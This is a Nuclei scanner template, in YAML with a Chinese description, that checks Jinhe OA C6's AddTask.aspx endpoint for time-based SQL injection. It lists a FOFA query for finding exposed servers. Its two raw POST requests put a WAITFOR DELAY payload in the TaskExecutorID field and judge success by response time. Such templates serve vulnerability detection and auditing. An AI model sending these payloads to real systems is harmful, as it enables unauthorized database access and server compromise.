id: jinheOA-C6-AddTask_aspx-sql-time

info:
  name: 金和OA C6 AddTask.aspx SQL延时注入漏洞
  author: Superhero
  severity: high
  description: |-
    fofa: app="金和网络-金和OA"
    金和OA C6 AddTask.aspx接口处存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
  reference:
    - https://mp.weixin.qq.com/s/hpn-xScB-AM0BQGDxyol9Q
  tags: sql injection

http:
  - raw:
      - |
        POST /c6/Jhsoft.Web.dailytaskmanage/AddTask.aspx/ HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/xml

        <root>
          <Page>
            <PageName>TaskDetect</PageName>
          </Page>
          <StartTime>2023-01-01 00:00:00</StartTime>
          <EndTime>2023-01-01 00:00:00</EndTime>
          <TaskExecutorID>3');WAITFOR DELAY'0:0:4'-- </TaskExecutorID>
        </root>
      - |
        POST /c6/Jhsoft.Web.dailytaskmanage/AddTask.aspx/ HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/xml

        <root>
          <Page>
            <PageName>TaskDetect</PageName>
          </Page>
          <StartTime>2023-01-01 00:00:00</StartTime>
          <EndTime>2023-01-01 00:00:00</EndTime>
          <TaskExecutorID>3');WAITFOR DELAY'0:0:8'-- </TaskExecutorID>
        </root>
    matchers:
      - type: dsl
        dsl:
          - 'duration_1>=4 && duration_1<=5'  
          - 'duration_2>=8 && duration_2<=9'
        condition: and